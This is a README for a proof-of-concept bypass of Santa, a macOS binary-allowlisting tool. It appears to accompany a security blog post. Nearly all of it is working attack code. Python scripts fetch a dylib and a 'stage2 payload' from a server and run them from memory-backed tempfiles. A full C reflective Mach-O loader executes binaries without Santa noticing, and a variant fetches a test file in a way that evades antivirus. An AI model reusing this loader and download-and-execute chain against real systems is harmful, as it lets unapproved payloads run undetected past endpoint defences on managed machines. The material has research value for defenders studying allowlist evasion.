# santa bypass poc

See my [blog post](https://blog.coffinsec.com/research/2019/01/08/OSX-naughtiness-bypassing-santa.html) here for a full walkthrough.

This PoC uses the concept of library injection but without the need for an injectable binary. Instead, the library is loaded using Python's `ctypes` module. The library uses code taken from [prior research](https://threatvector.cylance.com/en_us/home/running-executables-on-macos-from-memory.html) by Stephanie Archibald that was slightly modified to work in this context. Put together, this allows me to execute Mach-O binaries without Santa knowing. The PoC code below shows two ways this can be used. 


## Build

Build `runbin_mod.c` using the commands below:

```
gcc -o runbin_mod.os -c -Wall -fPIC runbin_mod.c
gcc -o rlm.dylib -dynamiclib runbin_mod.os
```

## PoC1

```py
#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import ctypes
if '__main__' == __name__:
  mylib = ctypes.cdll.LoadLibrary("rlm.dylib")
  mylib.launch("/bin/cp")
```

The output below shows `/bin/ls` successfully executing through our script and library. This execution is not detected by Santa.

```
$ python poc.py 
usage: cp [-R [-H | -L | -P]] [-fi | -n] [-apvXc] source_file target_file
       cp [-R [-H | -L | -P]] [-fi | -n] [-apvXc] source_file ... target_directory
```


## PoC2
Download the dylib from a remote server

```py
#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import requests, ctypes
if '__main__' == __name__:
  r = requests.get("http://localhost:8080/rlm.dylib")
  r.raise_for_status()
  f = open("/tmp/lib", "wb")
  f.write(bytes(r.content))
  f.seek(0)
  mylib = ctypes.cdll.loadlibrary(f.name)
  mylib.launch("/bin/cp")

```

## PoC3

**detected by AV**:
```py
#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import requests
if '__main__' == __name__:
  # get the dylib from remote server
  r = requests.get("http://2016.eicar.org/download/eicar.com")
  r.raise_for_status()

  f = open("/tmp/eicsar.com", "wb")
  f.write(bytes(r.content))
  f.seek(0)
  f.close()
```

**undetected by AV**
```py
#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import tempfile
import requests
if '__main__' == __name__:
  # get the dylib from remote server
  r = requests.get("http://2016.eicar.org/download/eicar.com")
  r.raise_for_status()
  # create a NamedTemporaryFile object to hold the dylib
  f = tempfile.NamedTemporaryFile(delete=True)
  f.write(bytes(r.content))
  f.seek(0)
  f.close()
```

## PoC Full

Load the dylib and binary from a remote server using memory-backed tempfiles.

```py
#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import ctypes
import tempfile
import requests
if '__main__' == __name__:
  # get the dylib from remote server
  r = requests.get("http://localhost:8080/rlm.dylib")
  r.raise_for_status()

  # create a NamedTemporaryFile object to hold the dylib
  f = tempfile.NamedTemporaryFile(delete=True)
  f.write(bytes(r.content))
  f.seek(0)

  # get the stage2 payload from the server
  r = requests.get("http://localhost:8080/t1")
  r.raise_for_status()

  # create a NamedTemporaryFile object to hold the binary
  b = tempfile.NamedTemporaryFile(delete=True)
  b.write(bytes(r.content))
  b.seek(0)
  
  # load the dylib from the tempfile and execute the stage2 payload
  mylib = ctypes.cdll.LoadLibrary(f.name)
  mylib.launch(b.name)
```

The output below shows the library and the `t1` binary are successfully downloaded and used to execute the target binary. These files disappear after the process exists.

```
$ python poc2.py
Hello, world!! I hope Santa doesn't catch me being naughty!
```

## The "loader" Library

This is the modified version of Stephanie's code that is used to load and execute the binary from memory.

```C
#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>

#define EXECUTABLE_BASE_ADDR 0x100000000
#define DYLD_BASE 0x00007fff5fc00000

int find_macho(unsigned long addr, unsigned long *base, unsigned int increment, unsigned int dereference) {
	unsigned long ptr;

	// find a Mach-O header by searching from address.
	*base = 0;
		
	while(1) {
		ptr = addr;
		if(dereference) ptr = *(unsigned long *)ptr;
		chmod((char *)ptr, 0777);
		if(errno == 2 /*ENOENT*/ &&
			((int *)ptr)[0] == 0xfeedfacf /*MH_MAGIC_64*/) {
			*base = ptr;
			return 0;
		}

		addr += increment;
	}
	return 1;
}

int find_epc(unsigned long base, struct entry_point_command **entry) {
	// find the entry point command by searching through base's load commands

	struct mach_header_64 *mh;
	struct load_command *lc;

	*entry = NULL;

	mh = (struct mach_header_64 *)base;
	lc = (struct load_command *)(base + sizeof(struct mach_header_64));
	for(int i=0; i<mh->ncmds; i++) {
		if(lc->cmd == LC_MAIN) {	//0x80000028
			*entry = (struct entry_point_command *)lc;
			return 0;
		}

		lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
	}

	return 1;
}

int load_from_disk(char *filename, char **buf, unsigned int *size) {
	int fd;
	struct stat s;

	if((fd = open(filename, O_RDONLY)) == -1) return 1;
	if(fstat(fd, &s)) return 1;
	
	*size = s.st_size;

	if((*buf = mmap(NULL, (*size) * sizeof(char), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON, -1, 0)) == MAP_FAILED) return 1;
	if(read(fd, *buf, *size * sizeof(char)) != *size) {
		free(*buf);
		*buf = NULL;
		return 1;
	}

	close(fd);

	return 0;
}

int load_and_exec(char *filename) {
	// Load the binary specified by filename using dyld
	char *binbuf = NULL;
	unsigned int size;

	// load filename into a buf in memory
	if(load_from_disk(filename, &binbuf, &size)) goto err;

	// change the filetype to a bundle
	int type = ((int *)binbuf)[3];
	if(type != 0x8) ((int *)binbuf)[3] = 0x8; //change to mh_bundle type

	// create file image
	NSObjectFileImage fi; 
	if(NSCreateObjectFileImageFromMemory(binbuf, size, &fi) != 1) {
		fprintf(stderr, "Could not create image.\n");
		goto err;
	}

	// link image
	NSModule nm = NSLinkModule(fi, "mytest", NSLINKMODULE_OPTION_PRIVATE |
						                NSLINKMODULE_OPTION_BINDNOW);
	if(!nm) {
		fprintf(stderr, "Could not link image.\n");
		goto err;
	}

	// find entry point and call it
	if(type == 0x2) { //mh_execute
		unsigned long execute_base;
		struct entry_point_command *epc;

		if(find_macho((unsigned long)nm, &execute_base, sizeof(int), 1)) {
			fprintf(stderr, "Could not find execute_base.\n");
			goto err;
		}

		if(find_epc(execute_base, &epc)) {
			fprintf(stderr, "Could not find ec.\n");
			goto err;
		}

		int(*main)(int, char**, char**, char**) = (int(*)(int, char**, char**, char**))(execute_base + epc->entryoff); 
		char *argv[]={"test", NULL};
		int argc = 1;
		char *env[] = {NULL};
		char *apple[] = {NULL};
		return main(argc, argv, env, apple);
	}	
err:
	if(binbuf) free(binbuf);
	return 1;
}

int launch(char *target) {
	return load_and_exec(target);
}
```
